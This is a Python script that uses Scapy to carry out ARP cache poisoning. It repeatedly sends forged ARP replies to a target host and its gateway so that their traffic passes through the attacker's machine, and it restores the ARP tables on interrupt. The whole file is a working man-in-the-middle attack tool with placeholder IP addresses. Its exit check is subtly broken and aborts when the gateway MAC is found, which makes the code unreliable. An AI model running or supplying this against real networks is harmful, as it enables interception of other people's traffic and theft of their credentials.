from scapy.all import *
import threading
import time
import sys

def get_mac(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),timeout=2,verbose=False)
    if len(ans)==0:
      return None
    else:
         for sent,received in ans:
           print(received.psrc,"-->",received.hwsrc)
           return received.hwsrc
           

def poison(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP(op = 2,
                        psrc = gateway_ip,
                        pdst = target_ip,
                        hwdst = target_mac)
    send(poison_target,verbose=False)
    print(f"[*] Sendind poison arp packet to victim:{target_ip},gateway:{gateway_ip}")
    poison_gateway = ARP(op = 2,
                         psrc = target_ip,
                         pdst = gateway_ip,
                         hwdst = gateway_mac)
    send(poison_gateway,verbose=False)
    print(f"[*] Sendind poison arp packet to gateway:{gateway_ip},we are victim:{target_ip}")


def restore(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2,
             psrc=gateway_ip,
             pdst=target_ip,
             hwdst=target_mac,
             hwsrc=gateway_mac), count=5, verbose=False)

    send(ARP(op=2,
             psrc=target_ip,
             pdst=gateway_ip,
             hwdst=gateway_mac,
             hwsrc=target_mac), count=5, verbose=False)
    print("[*] ARP table is restored")


if __name__ == "__main__":
    target_ip = "target_ip"
    target_mac = get_mac(target_ip)
    gateway_ip = "gateway_ip"
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or gateway_mac:
        print(f"[-] Couldn't get a mac address")
        sys.exit(1)
  
    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")
    print(f"[*] Starting arp poisoning")

    try:
        while True:
            poison(gateway_ip,gateway_mac,target_ip,target_mac)
            print(f"[*] Packets are sent")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n[*] Stopping the attack")
        restore(gateway_ip, gateway_mac, target_ip, target_mac)


